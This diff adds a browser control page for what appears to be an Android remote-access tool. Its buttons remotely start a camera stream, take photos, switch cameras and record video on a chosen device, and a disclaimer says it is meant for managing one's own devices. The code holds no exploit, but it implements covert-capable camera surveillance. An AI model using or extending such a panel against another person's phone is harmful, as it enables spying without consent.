@@ -1,0 +1,338 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        .camera-container {
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 16px;
+            text-align: center;
+            min-height: 300px;
+            position: relative;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 16px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+        }
+
+        header::before {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>Camera Control</h1>
+            <a href="index.html" class="btn btn-secondary">&lt;-- Back</a>
+        </header>
+
+        <div class="controls">
+            <!-- Preview Controls -->
+            <button class="btn btn-primary" id="btn-start-preview">START PREVIEW</button>
+            <button class="btn btn-secondary" id="btn-stop-preview" style="display: none;">STOP PREVIEW</button>
+
+            <!-- Photo/Video Controls -->
+            <button class="btn btn-primary" id="btn-photo">TAKE PHOTO</button>
+            <button class="btn btn-secondary" id="btn-switch">SWITCH CAM</button>
+
+            <!-- Recording Controls -->
+            <button class="btn btn-danger" id="btn-start-record">RECORD VIDEO</button>
+            <button class="btn btn-danger" id="btn-stop-record" style="display: none;">STOP RECORDING</button>
+        </div>
+
+        <div class="camera-container">
+            <div id="status-indicator" style="margin-bottom: 10px; color: var(--text-muted); font-size: 0.85rem;">State:
+                IDLE</div>
+            <div class="rec-timer" id="rec-timer" style="display:none;">
+                <span class="rec-dot"></span>
+                <span id="rec-time">00:00</span>
+            </div>
+            <div id="placeholder" class="placeholder">
+                Click "START PREVIEW" to view camera feed
+            </div>
+            <img id="camera-display" style="display: none;" />
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        const imgDisplay = document.getElementById('camera-display');
+        const placeholder = document.getElementById('placeholder');
+        const statusIndicator = document.getElementById('status-indicator');
+
+        // Buttons
+        const btnStartPreview = document.getElementById('btn-start-preview');
+        const btnStopPreview = document.getElementById('btn-stop-preview');
+        const btnPhoto = document.getElementById('btn-photo');
+        const btnSwitch = document.getElementById('btn-switch');
+        const btnStartRecord = document.getElementById('btn-start-record');
+        const btnStopRecord = document.getElementById('btn-stop-record');
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // State Machine
+        const STATES = {
+            IDLE: 'IDLE',
+            PREVIEWING: 'PREVIEWING',
+            RECORDING: 'RECORDING'
+        };
+        let currentState = STATES.IDLE;
+        let recStartTime = null;
+        let recTimerInterval = null;
+
+        function startRecTimer() {
+            recStartTime = Date.now();
+            document.getElementById('rec-timer').style.display = 'inline-flex';
+            recTimerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - recStartTime) / 1000);
+                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const s = String(elapsed % 60).padStart(2, '0');
+                document.getElementById('rec-time').textContent = `${m}:${s}`;
+            }, 1000);
+        }
+
+        function stopRecTimer() {
+            clearInterval(recTimerInterval);
+            recTimerInterval = null;
+            document.getElementById('rec-timer').style.display = 'none';
+            document.getElementById('rec-time').textContent = '00:00';
+        }
+
+        function updateUI(state) {
+            currentState = state;
+            statusIndicator.textContent = `State: ${state}`;
+
+            // Utility to show/hide
+            const show = (el) => { el.style.display = 'inline-block'; el.disabled = false; el.style.opacity = '1'; };
+            const hide = (el) => el.style.display = 'none';
+            const disable = (el) => { el.style.display = 'inline-block'; el.disabled = true; el.style.opacity = '0.5'; };
+
+            switch (state) {
+                case STATES.IDLE:
+                    show(btnStartPreview);
+                    hide(btnStopPreview);
+                    disable(btnStartRecord); // Requires preview first
+                    hide(btnStopRecord);
+                    disable(btnPhoto);  // Requires preview first
+                    disable(btnSwitch); // Requires preview first
+
+                    hide(imgDisplay);
+                    show(placeholder);
+                    break;
+
+                case STATES.PREVIEWING:
+                    hide(btnStartPreview);
+                    show(btnStopPreview);
+                    show(btnStartRecord);
+                    hide(btnStopRecord);
+                    show(btnPhoto);
+                    show(btnSwitch);
+
+                    show(imgDisplay);
+                    hide(placeholder);
+                    break;
+
+                case STATES.RECORDING:
+                    hide(btnStartPreview);
+                    hide(btnStopPreview);
+                    hide(btnStartRecord);
+                    show(btnStopRecord);
+                    disable(btnPhoto);
+                    hide(btnSwitch);
+
+                    show(imgDisplay);
+                    show(placeholder);
+                    placeholder.classList.add('recording-overlay');
+                    placeholder.innerHTML = '<div style="background: rgba(255,0,0,0.7); color: white; padding: 10px; border-radius: 5px;">&#x1F534; Recording...</div>';
+                    placeholder.style.position = 'absolute';
+                    placeholder.style.top = '10px';
+                    placeholder.style.left = '50%';
+                    placeholder.style.transform = 'translateX(-50%)';
+                    placeholder.style.zIndex = '100';
+                    placeholder.style.background = 'transparent';
+                    startRecTimer();
+                    break;
+            }
+        }
+
+        // --- PREVIEW ---
+        async function startPreview() {
+            try {
+                updateUI(STATES.PREVIEWING);
+                await api.sendCommand(deviceId, 'camera_stream_start');
+                api.showToast('Camera preview started', 'success');
+            } catch (error) {
+                console.error(error);
+                api.showToast('Failed to start preview: ' + error.message, 'error');
+                updateUI(STATES.IDLE);
+            }
+        }
+
+        async function stopPreview() {
+            try {
+                await api.sendCommand(deviceId, 'camera_stream_stop');
+                updateUI(STATES.IDLE);
+                api.showToast('Camera preview stopped', 'success');
+            } catch (error) {
+                console.error(error);
+                api.showToast('Failed to stop preview: ' + error.message, 'error');
+            }
+        }
+
+        // Helper to prettify path
+        function prettifyPath(path) {
+            if (!path) return 'Downloads/RemoteAccess';
+            return path.replace('/storage/emulated/0/', '');
+        }
+
+        // Track recording path
+        let lastRecordingPath = '';
+
+        // --- PHOTO ---
+        async function takePhoto() {
+            if (!window.api) {
+                console.error('API not initialized');
+                return;
+            }
+            try {
+                const result = await window.api.sendCommand(deviceId, 'camera_snap');
+                if (result.path || result.displayPath) {
+                    const displayPath = result.displayPath || prettifyPath(result.path);
+                    window.api.showToast(`Photo saved to: ${displayPath}`, 'success');
+                }
+            } catch (error) {
+                window.api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // --- SWITCH ---
+        async function switchCamera() {
+            if (!window.api) return;
+            try {
+                await window.api.sendCommand(deviceId, 'camera_switch');
+                window.api.showToast('Camera switched', 'success');
+            } catch (error) {
+                window.api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // --- RECORDING ---
+        async function startRecording() {
+            if (!window.api) return;
+            try {
+                updateUI(STATES.RECORDING);
+                const response = await window.api.sendCommand(deviceId, 'camera_record_start');
+
+
+                if (response && response.path) {
+                    lastRecordingPath = response.path;
+                }
+
+                window.api.showToast('Recording started', 'success');
+            } catch (error) {
+                console.error(error);
+                window.api.showToast('Failed to start recording: ' + error.message, 'error');
+                updateUI(STATES.IDLE);
+            }
+        }
+
+        async function stopRecording() {
+            if (!window.api) return;
+            try {
+                await window.api.sendCommand(deviceId, 'camera_record_stop');
+                stopRecTimer();
+                updateUI(STATES.PREVIEWING);
+
+                const displayPath = prettifyPath(lastRecordingPath);
+                window.api.showToast(`Recording saved to: ${displayPath}`, 'success');
+            } catch (error) {
+                console.error(error);
+                window.api.showToast('Failed to stop recording: ' + error.message, 'error');
+            }
+        }
+
+        // Initialize
+        updateUI(STATES.IDLE);
+
+        // Event Listeners
+        btnStartPreview.addEventListener('click', startPreview);
+        btnStopPreview.addEventListener('click', stopPreview);
+        btnPhoto.addEventListener('click', takePhoto);
+        btnSwitch.addEventListener('click', switchCamera);
+        btnStartRecord.addEventListener('click', startRecording);
+        btnStopRecord.addEventListener('click', stopRecording);
+
+        // WebSocket for Camera Frames
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${wsProtocol}//${window.location.host}`;
+        const ws = new WebSocket(wsUrl);
+
+        ws.onopen = () => {
+            console.log('Camera WebSocket connected');
+            ws.send(JSON.stringify({ type: 'identify', deviceId: 'browser' }));
+        };
+
+        ws.onmessage = (event) => {
+            try {
+                const message = JSON.parse(event.data);
+
+                if (message.type === 'camera_frame' && message.deviceId === deviceId) {
+                    // Render frames during BOTH preview and recording
+                    if (currentState === STATES.PREVIEWING || currentState === STATES.RECORDING) {
+                        if (imgDisplay.style.display === 'none') {
+                            const label = currentState === STATES.RECORDING ? 'RECORDING' : 'PREVIEWING';
+                            document.getElementById('status-indicator').textContent = `State: ${label} (Receiving Frames)`;
+                            imgDisplay.style.display = 'block';
+                        }
+                        imgDisplay.src = `data:image/jpeg;base64,${message.data}`;
+                    }
+                }
+
+                if (message.type === 'command_result') {
+                    // Could update UI based on success/failure here
+                }
+            } catch (e) {
+                // Ignore non-JSON messages
+            }
+        };
+
+        ws.onerror = (error) => {
+            console.error('WebSocket error:', error);
+        };
+    </script>
+
+  <!-- Disclaimer -->
+  <div class="container">
+    <div class="disclaimer">
+      <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+      <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely manage their own devices. Installing or using this application on a device without the owner's explicit consent is illegal and unethical. The developers assume no liability for misuse. By using this application, you agree that you are solely responsible for how it is used.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <p class="footer-created">Created by</p>
+    <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+    <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+  </footer>
+</body>
+
+</html>
